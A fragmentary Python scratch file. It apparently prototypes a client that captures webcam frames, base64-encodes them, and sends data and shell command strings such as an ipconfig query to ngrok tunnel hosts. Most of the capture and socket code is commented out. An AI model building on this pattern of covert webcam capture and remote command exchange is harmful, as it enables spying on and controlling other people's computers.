import time
import socket
import cv2
import numpy as np
import json
import base64
import requests as req
#cap =  cv2.VideoCapture(0)
#s = time.sleep

#while True:
#rat,frame = cap.read()
#img = frame
#cv2.imshow('frame',frame)
      #if cv2.waitKey(1) & 0xFF == ord('q'):
       #     break
#cap.release()
#cv2.destroyAllWindows()
#img_counter = 0
#img_name = "opencv_frame_{}.png".format(img_counter)
#cv2.imwrite(img_name, frame)
#print("{} written!".format(img_name))
#data = {}
#data['img'] = base64.encodebytes(img).decode('utf-8')

#print(json.dumps(data))
#HOST = 'd329dce67a9d.ngrok.io'  # The server's hostname or IP address
#PORT = 80        # The port used by the server

#with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#    s.connect((HOST, PORT))
#    s.sendall(b'google.com')
#    data = s.recv(10000000)
#print(msg.decode("utf-8"))
#print('Received' +  data.decode("utf-8"))


#
import requests

url = 'http://805469314e7c.ngrok.io'
#files = {'media': frame}
myobj = {'somekey': 'somevalue'}
string = "ipconfig | find \"IPv4 Address\""
string1 = "python;exit()"
x = requests.post(url, data = string)

print(x.text)

#resp = req.get("http://192.168.56.1")

#print(resp.text)
